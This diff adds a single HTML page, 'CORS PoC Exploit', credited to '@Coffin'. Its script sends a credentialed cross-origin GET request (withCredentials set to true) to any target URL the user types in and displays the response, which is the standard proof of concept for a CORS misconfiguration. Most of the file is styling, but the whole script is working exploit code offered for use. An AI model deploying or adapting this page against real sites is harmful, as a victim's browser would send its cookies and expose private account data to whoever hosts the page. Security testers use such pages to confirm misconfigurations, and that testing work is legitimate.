@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS PoC Exploit</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #0f1115 0%, #1a1f2e 100%);
+            color: #eaeaea;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: rgba(22, 26, 32, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 16px;
+            box-shadow: 
+                0 20px 40px rgba(0, 0, 0, 0.5),
+                0 0 0 1px rgba(255, 255, 255, 0.05),
+                0 0 60px rgba(0, 255, 204, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            overflow: hidden;
+        }
+
+        .header {
+            padding: 30px 40px;
+            background: linear-gradient(90deg, rgba(0, 255, 204, 0.1) 0%, transparent 100%);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 700;
+            color: #00ffcc;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #888;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .subtitle a {
+            color: #4da3ff;
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+
+        .subtitle a:hover {
+            color: #00ffcc;
+        }
+
+        .content {
+            padding: 30px 40px;
+        }
+
+        .input-group {
+            margin-bottom: 24px;
+        }
+
+        .label {
+            display: block;
+            font-size: 14px;
+            color: #888;
+            margin-bottom: 8px;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 14px 16px 14px 50px;
+            font-size: 15px;
+            border-radius: 10px;
+            border: 2px solid rgba(255, 255, 255, 0.05);
+            background: rgba(11, 14, 19, 0.8);
+            color: #eaeaea;
+            transition: all 0.3s ease;
+        }
+
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #00ffcc;
+            background: rgba(11, 14, 19, 1);
+            box-shadow: 0 0 0 4px rgba(0, 255, 204, 0.1);
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #666;
+            font-size: 18px;
+        }
+
+        .controls {
+            display: flex;
+            gap: 16px;
+            margin: 24px 0;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .btn {
+            padding: 12px 24px;
+            font-size: 15px;
+            font-weight: 600;
+            background: linear-gradient(135deg, #00ffcc 0%, #00d4aa 100%);
+            color: #0f1115;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(0, 255, 204, 0.2);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 255, 204, 0.3);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .toggle-group {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: rgba(42, 47, 58, 0.5);
+            padding: 8px 16px;
+            border-radius: 10px;
+        }
+
+        .toggle-label {
+            font-size: 14px;
+            color: #aaa;
+            font-weight: 500;
+        }
+
+        .toggle-switch {
+            position: relative;
+            width: 50px;
+            height: 26px;
+        }
+
+        .toggle-switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .toggle-slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(42, 47, 58, 0.8);
+            transition: .4s;
+            border-radius: 34px;
+        }
+
+        .toggle-slider:before {
+            position: absolute;
+            content: "";
+            height: 18px;
+            width: 18px;
+            left: 4px;
+            bottom: 4px;
+            background-color: #0f1115;
+            transition: .4s;
+            border-radius: 50%;
+        }
+
+        input:checked + .toggle-slider {
+            background-color: #00ffcc;
+        }
+
+        input:checked + .toggle-slider:before {
+            transform: translateX(24px);
+        }
+
+        .output-section {
+            margin-top: 32px;
+        }
+
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+
+        .section-title {
+            font-size: 16px;
+            color: #888;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .status-badge {
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            background: rgba(42, 47, 58, 0.5);
+        }
+
+        .status-idle {
+            color: #888;
+        }
+
+        .status-loading {
+            color: #00ffcc;
+            animation: pulse 1.5s infinite;
+        }
+
+        .status-success {
+            color: #4ade80;
+        }
+
+        .status-error {
+            color: #f87171;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+
+        .output-area {
+            background: rgba(11, 14, 19, 0.8);
+            border: 2px solid rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            padding: 20px;
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 14px;
+            line-height: 1.6;
+            min-height: 300px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            color: #eaeaea;
+            transition: all 0.3s ease;
+        }
+
+        .output-area:focus {
+            outline: none;
+            border-color: #00ffcc;
+            box-shadow: 0 0 0 4px rgba(0, 255, 204, 0.1);
+        }
+
+        .output-area.json {
+            color: #eaeaea;
+        }
+
+        .output-area.json .key {
+            color: #4da3ff;
+        }
+
+        .output-area.json .string {
+            color: #a5d6ff;
+        }
+
+        .output-area.json .number {
+            color: #f87171;
+        }
+
+        .output-area.json .boolean {
+            color: #4ade80;
+        }
+
+        .output-area.json .null {
+            color: #fbbf24;
+        }
+
+        .output-area.json .brace, .output-area.json .bracket {
+            color: #eaeaea;
+        }
+
+        .empty-state {
+            color: #666;
+            font-style: italic;
+            text-align: center;
+            padding: 60px 20px;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                margin: 0;
+                border-radius: 0;
+                min-height: 100vh;
+            }
+
+            .header, .content {
+                padding: 20px;
+            }
+
+            h1 {
+                font-size: 24px;
+            }
+
+            .controls {
+                flex-direction: column;
+                align-items: stretch;
+            }
+
+            .toggle-group {
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>CORS PoC Exploit</h1>
+            <div class="subtitle">
+                Created by <a href="https://m.youtube.com/@lostsec_vip" target="_blank">@Coffin</a>
+            </div>
+        </div>
+        
+        <div class="content">
+            <div class="input-group">
+                <label class="label">Target URL</label>
+                <div class="input-wrapper">
+                    <span class="input-icon">🔗</span>
+                    <input 
+                        type="text" 
+                        id="targetUrl" 
+                        placeholder="https://target.com/api/endpoint"
+                        autocomplete="off"
+                    >
+                </div>
+            </div>
+
+            <div class="controls">
+                <button 
+                    id="fetchBtn" 
+                    class="btn" 
+                    onclick="exploitCORS()"
+                >
+                    <span>🚀</span>
+                    Fetch
+                </button>
+
+                <div class="toggle-group">
+                    <span class="toggle-label">Format:</span>
+                    <label class="toggle-switch">
+                        <input type="checkbox" id="formatToggle" onchange="renderOutput()">
+                        <span class="toggle-slider"></span>
+                    </label>
+                    <span class="toggle-label" id="formatLabel">Raw</span>
+                </div>
+            </div>
+
+            <div class="output-section">
+                <div class="section-header">
+                    <span class="section-title">Response Output</span>
+                    <span class="status-badge status-idle" id="statusBadge">Idle</span>
+                </div>
+                <pre class="output-area" id="fetchedResource">
+                    <div class="empty-state">Waiting for request...</div>
+                </pre>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let lastResponse = "";
+        let isLoading = false;
+
+        function updateStatus(status) {
+            const badge = document.getElementById('statusBadge');
+            badge.className = 'status-badge status-' + status;
+            
+            switch(status) {
+                case 'idle':
+                    badge.textContent = 'Idle';
+                    break;
+                case 'loading':
+                    badge.textContent = 'Loading...';
+                    break;
+                case 'success':
+                    badge.textContent = 'Success';
+                    break;
+                case 'error':
+                    badge.textContent = 'Error';
+                    break;
+            }
+        }
+
+        function exploitCORS() {
+            const url = document.getElementById("targetUrl").value.trim();
+            if (!url) {
+                showNotification('Please enter a target URL', 'error');
+                return;
+            }
+
+            const fetchBtn = document.getElementById('fetchBtn');
+            fetchBtn.disabled = true;
+            isLoading = true;
+            updateStatus('loading');
+
+            const req = new XMLHttpRequest();
+            req.withCredentials = true;
+
+            req.onload = function () {
+                lastResponse = this.responseText;
+                isLoading = false;
+                fetchBtn.disabled = false;
+                updateStatus('success');
+                renderOutput();
+            };
+
+            req.onerror = function () {
+                isLoading = false;
+                fetchBtn.disabled = false;
+                updateStatus('error');
+                document.getElementById("fetchedResource").innerHTML = 
+                    '<div class="empty-state">Request failed or blocked by the browser.</div>';
+            };
+
+            req.open("GET", url, true);
+            req.send();
+        }
+
+        function renderOutput() {
+            const output = document.getElementById("fetchedResource");
+            const isJSON = document.getElementById("formatToggle").checked;
+            const formatLabel = document.getElementById("formatLabel");
+
+            if (!lastResponse) {
+                output.innerHTML = '<div class="empty-state">No response available.</div>';
+                return;
+            }
+
+            if (!isJSON) {
+                output.textContent = lastResponse;
+                output.className = 'output-area';
+                formatLabel.textContent = 'Raw';
+                return;
+            }
+
+            try {
+                const parsed = JSON.parse(lastResponse);
+                output.innerHTML = syntaxHighlight(JSON.stringify(parsed, null, 2));
+                output.className = 'output-area json';
+                formatLabel.textContent = 'JSON';
+            } catch {
+                output.innerHTML = '<div class="empty-state">Response is not valid JSON.</div>' + 
+                                 '<br><br>' + escapeHtml(lastResponse);
+                output.className = 'output-area';
+                formatLabel.textContent = 'Raw';
+            }
+        }
+
+        function syntaxHighlight(json) {
+            json = json.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+            return json.replace(/("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d*)?(?:[eE][+-]?\d+)?)/g, function(match) {
+                let cls = 'number';
+                if (/^"/.test(match)) {
+                    if (/:$/.test(match)) {
+                        cls = 'key';
+                    } else {
+                        cls = 'string';
+                    }
+                } else if (/true|false/.test(match)) {
+                    cls = 'boolean';
+                } else if (/null/.test(match)) {
+                    cls = 'null';
+                }
+                return '<span class="' + cls + '">' + match + '</span>';
+            });
+        }
+
+        function escapeHtml(text) {
+            const map = {
+                '&': '&amp;',
+                '<': '&lt;',
+                '>': '&gt;',
+                '"': '&quot;',
+                "'": '&#039;'
+            };
+            return text.replace(/[&<>"']/g, m => map[m]);
+        }
+
+        function showNotification(message, type) {
+            const output = document.getElementById("fetchedResource");
+            output.innerHTML = `<div class="empty-state" style="color: ${type === 'error' ? '#f87171' : '#4ade80'}">${message}</div>`;
+        }
+
+        // Initialize
+        document.getElementById('formatToggle').checked = false;
+    </script>
+</body>
+</html>
